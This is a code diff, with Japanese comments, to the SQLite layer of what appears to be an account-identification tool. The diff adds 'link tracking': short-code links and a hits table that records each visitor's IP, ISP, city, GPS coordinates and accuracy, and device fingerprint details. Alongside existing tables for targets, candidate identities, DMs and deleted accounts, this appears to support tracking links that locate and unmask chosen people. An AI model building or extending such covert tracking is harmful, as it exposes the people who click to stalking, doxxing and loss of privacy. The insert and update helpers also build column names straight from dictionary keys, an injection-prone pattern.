@@ -1,4 +1,4 @@
-"""SQLite スキーマとアクセス層。特定エンジン用テーブルを大幅追加。"""
+"""SQLite スキーマとアクセス層。特定エンジン + リンク追跡。"""
 import sqlite3, json, datetime as dt, os
 from contextlib import contextmanager
 
@@ -119,12 +119,30 @@ CREATE TABLE IF NOT EXISTS saved_pairs (
     note TEXT, added_at TEXT,
     UNIQUE(target_uid, candidate_uid)
 );
+CREATE TABLE IF NOT EXISTS links (
+    code TEXT PRIMARY KEY, name TEXT, dest TEXT, note TEXT,
+    mode TEXT DEFAULT 'page', created_at TEXT,
+    hit_count INTEGER DEFAULT 0, active INTEGER DEFAULT 1
+);
+CREATE TABLE IF NOT EXISTS link_hits (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    code TEXT, ts TEXT, ip TEXT, ua TEXT, lang TEXT, referer TEXT,
+    accept TEXT, headers TEXT, query TEXT,
+    country TEXT, country_code TEXT, region TEXT, city TEXT, zip TEXT,
+    isp TEXT, org TEXT, asn TEXT, tz TEXT, lat REAL, lon REAL,
+    gps_lat REAL, gps_lon REAL, gps_acc REAL,
+    device TEXT, os TEXT, browser TEXT, inapp TEXT,
+    is_bot INTEGER DEFAULT 0, is_mobile INTEGER, is_proxy INTEGER, is_hosting INTEGER,
+    screen TEXT, platform TEXT, cores INTEGER, mem REAL, touch INTEGER,
+    extra TEXT, note TEXT
+);
 CREATE INDEX IF NOT EXISTS idx_events_ts ON events(ts);
 CREATE INDEX IF NOT EXISTS idx_dm_msg ON dm_messages(thread_id, timestamp);
 CREATE INDEX IF NOT EXISTS idx_snap ON profile_snapshots(user_id, taken_at);
 CREATE INDEX IF NOT EXISTS idx_scores_run ON identity_scores(run_id, score);
 CREATE INDEX IF NOT EXISTS idx_forensics_ts ON forensics(ts);
 CREATE INDEX IF NOT EXISTS idx_known_seen ON known_accounts(last_seen);
+CREATE INDEX IF NOT EXISTS idx_hits_code ON link_hits(code, ts);
 """
 
 
@@ -142,13 +160,14 @@ class DB:
         self._migrate()
 
     def _migrate(self):
-        """既存DBに後から増えたカラムを足す。"""
         def cols(t):
             return {r["name"] for r in self.q(f"PRAGMA table_info({t})")}
         add = {
             "identity_runs": [("candidates_raw", "TEXT"), ("note", "TEXT"),
                               ("target_deleted", "INTEGER DEFAULT 0")],
             "identity_scores": [("candidate_display", "TEXT"), ("flags", "TEXT")],
+            "link_hits": [("inapp", "TEXT"), ("platform", "TEXT"), ("cores", "INTEGER"),
+                          ("mem", "REAL"), ("touch", "INTEGER"), ("note", "TEXT")],
         }
         for table, defs in add.items():
             have = cols(table)
@@ -290,7 +309,7 @@ class DB:
             c.execute("DELETE FROM identity_scores WHERE run_id=?", (rid,))
             c.execute("DELETE FROM identity_runs WHERE id=?", (rid,))
 
-    # ---- 既知アカウント（削除済みIDの控え） ----
+    # ---- 既知アカウント ----
     def add_known(self, user_id, username="", note="", source="manual", deleted=None):
         uid = str(user_id)
         with self.tx() as c:
@@ -341,3 +360,57 @@ class DB:
     def del_pair(self, pid):
         with self.tx() as c:
             c.execute("DELETE FROM saved_pairs WHERE id=?", (pid,))
+
+    # ---- リンク追跡 ----
+    def add_link(self, code, name, dest, note="", mode="page"):
+        with self.tx() as c:
+            c.execute("""INSERT INTO links(code,name,dest,note,mode,created_at,hit_count,active)
+                VALUES(?,?,?,?,?,?,0,1)
+                ON CONFLICT(code) DO UPDATE SET name=excluded.name, dest=excluded.dest,
+                    note=excluded.note, mode=excluded.mode""",
+                (code, name, dest, note, mode, now()))
+
+    def links(self, limit=500):
+        return self.q("SELECT * FROM links ORDER BY created_at DESC LIMIT ?", (limit,))
+
+    def link_get(self, code):
+        return self.q1("SELECT * FROM links WHERE code=?", (code,))
+
+    def del_link(self, code):
+        with self.tx() as c:
+            c.execute("DELETE FROM links WHERE code=?", (code,))
+            c.execute("DELETE FROM link_hits WHERE code=?", (code,))
+
+    def set_link_active(self, code, flag):
+        with self.tx() as c:
+            c.execute("UPDATE links SET active=? WHERE code=?", (int(bool(flag)), code))
+
+    def bump_link(self, code):
+        with self.tx() as c:
+            c.execute("UPDATE links SET hit_count=hit_count+1 WHERE code=?", (code,))
+
+    def add_hit(self, d):
+        cols = list(d.keys())
+        with self.tx() as c:
+            cur = c.execute(
+                f"INSERT INTO link_hits({','.join(cols)}) VALUES({','.join(['?'] * len(cols))})",
+                [d[k] for k in cols])
+            return cur.lastrowid
+
+    def update_hit(self, hid, **f):
+        if not f:
+            return
+        sets = ",".join(f"{k}=?" for k in f)
+        with self.tx() as c:
+            c.execute(f"UPDATE link_hits SET {sets} WHERE id=?", list(f.values()) + [hid])
+
+    def hits(self, code, include_bots=True, limit=500):
+        sql = "SELECT * FROM link_hits WHERE code=?"
+        if not include_bots:
+            sql += " AND is_bot=0"
+        return self.q(sql + " ORDER BY ts DESC LIMIT ?", (code, limit))
+
+    def del_hits(self, code):
+        with self.tx() as c:
+            c.execute("DELETE FROM link_hits WHERE code=?", (code,))
+            c.execute("UPDATE links SET hit_count=0 WHERE code=?", (code,))
